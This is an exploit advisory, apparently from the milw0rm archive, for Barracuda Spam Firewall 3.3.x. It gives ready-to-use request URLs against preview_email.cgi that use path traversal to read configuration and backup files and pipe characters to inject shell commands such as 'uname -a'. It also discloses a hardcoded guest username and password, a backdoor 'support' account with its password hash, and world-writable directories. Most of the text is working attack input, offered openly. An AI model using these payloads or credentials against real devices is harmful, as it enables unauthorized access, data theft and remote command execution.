@@ -1,0 +1,57 @@
+Title: Barracuda Arbitrary File Disclosure + Command Execution
+Severity: High (Sensitive Information Disclosure)
+Date: 01 August 2006
+Version Affected: Barracuda Spam Firewall version 3.3.01.001 to 3.3.03.053
+Discovered by: Greg Sinclair
+Credits: Matthew Hall
+Update: 07 August 2006
+Updated by: PATz
+ 
+####################################################################
+ 
+Proof of Concept:
+https://<deviceIP>/cgi-bin/preview_email.cgi?file=/mail/mlog/../tmp/backup/periodic_config.txt.tmp
+https://<deviceIP>/cgi-bin/preview_email.cgi?file=/mail/mlog/../../bin/ls%20/|
+ 
+ 
+####################################################################
+ 
+#using |unix| for command execution:
+ 
+https://<deviceIP>/cgi-bin/preview_email.cgi?file=/mail/mlog/|uname%20-a|
+
+#admin login/pass vuln
+ 
+https://<deviceIP>/cgi-bin/preview_email.cgi?file=/mail/mlog|cat%20update_admin_passwd.pl|
+https://<deviceIP>/cgi-bin/preview_email.cgi?file=/mail/mlog/../bin/update_admin_passwd.pl
+ 
+eg.
+
+#`/home/emailswitch/code/firmware/current/bin/updateUser.pl guest phteam99 2>&1`;
+login: guest pass: phteam99
+
+some folder are accessible via http without permission
+https://<deviceIP>/Translators/
+https://<deviceIP>/images/
+https://<deviceIP>/locale
+https://<deviceIP>/plugins
+https://<deviceIP>/help
+ 
+#stuff in do_install
+ 
+/usr/sbin/useradd support -s /home/emailswitch/code/firmware/current/bin/request_support.pl -p swUpHFjf1MUiM
+ 
+## Create backup tmp dir
+
+/bin/mkdir -p /mail/tmp/backup/
+chmod -R 777 /mail/tmp/
+ 
+## Create smb backup mount point
+/bin/mkdir -p /mnt/smb/
+chmod 777 /mnt/smb/
+ 
+.................................
+Greetz to all noypi and phteam ^^,
+.............eof.................
+
+# milw0rm.com [2006-08-08]
